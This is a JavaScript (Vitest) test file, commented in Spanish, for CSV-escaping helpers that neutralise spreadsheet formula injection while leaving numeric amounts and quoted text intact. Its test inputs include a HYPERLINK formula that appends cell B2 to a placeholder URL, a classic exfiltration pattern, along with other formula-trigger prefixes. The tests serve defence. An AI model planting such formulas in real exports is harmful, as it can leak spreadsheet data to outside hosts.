import { describe, it, expect } from 'vitest'
import { celdaCsv, filaCsv } from './csv'

describe('celdaCsv (inyección de fórmulas)', () => {
  it('neutraliza lo que Excel ejecutaría', () => {
    expect(celdaCsv('=HYPERLINK("https://x/?"&B2,"Ver")')).toBe(`"'=HYPERLINK(""https://x/?""&B2,""Ver"")"`)
    expect(celdaCsv('+54 cmd')).toBe(`"'+54 cmd"`)
    expect(celdaCsv('@SUM(A1)')).toBe(`"'@SUM(A1)"`)
    expect(celdaCsv('-2+3')).toBe(`"'-2+3"`)
    expect(celdaCsv('\t=1')).toBe(`"'\t=1"`)
  })

  it('no toca montos, negativos incluidos', () => {
    expect(celdaCsv(-500)).toBe('"-500"')
    expect(celdaCsv('-500')).toBe('"-500"')
    expect(celdaCsv('1234.56')).toBe('"1234.56"')
    expect(celdaCsv(0)).toBe('"0"')
  })

  it('texto normal, vacíos y comillas', () => {
    expect(celdaCsv('iPhone 13 "Pro"')).toBe('"iPhone 13 ""Pro"""')
    expect(celdaCsv(null)).toBe('""')
    expect(celdaCsv(undefined)).toBe('""')
  })

  it('arma filas', () => {
    expect(filaCsv(['a', 1, '=1'])).toBe(`"a","1","'=1"`)
  })
})
